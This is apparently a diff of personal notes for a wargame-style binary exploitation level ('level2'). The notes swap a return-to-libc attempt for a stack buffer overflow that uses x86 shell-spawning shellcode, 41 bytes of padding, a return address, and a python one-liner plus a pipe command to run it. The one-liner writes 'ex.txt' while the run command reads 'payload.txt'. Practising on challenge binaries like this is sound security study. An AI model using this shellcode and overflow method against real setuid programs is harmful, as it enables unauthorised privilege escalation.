@@ -2,29 +2,15 @@
 *** Please note all text inside back-ticks (``) are commands.
 *** Enter these command on the command line.
 
-# Address of system.
- * go into gdb
-  `b main`
-  `run`
-  `p system`
- * Grab address of system. <system> = 0xb7e6b060
+** return address = 0x804a080
+** shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0"
+               "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+** Filling up buffer = "A" * 41
 
-** exit address = 0xb7e5ebe0
-** SHELL address = 0xbffff8f6
-** return address = 0x0804853e
 
-** used ltrace to find the address of the buffer = 0xbffff6bc
-  `ltrace ./level2`
-  _________________________________________________________________________________
-  __libc_start_main(0x804853f, 1, 0xbffff7b4, 0x8048550, 0x80485c0 <unfinished ...>
-  gets(0xbffff6bc, 0, 0, 0xb7e5ec73, 0x80482b5^[[C)            => = 0xbffff6bc. <=
-  _________________________________________________________________________________
-
-# Setting up exploit script
+# Setting up exploit line
   * So far we have:
-
-
 
 python -c 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A" * 41 + "\x08\xa0\x04\x08"' > ex.txt
 
-(cat payload.txt; cat) | $WDIR
+`(cat payload.txt; cat) | /home/user/level2/level2`
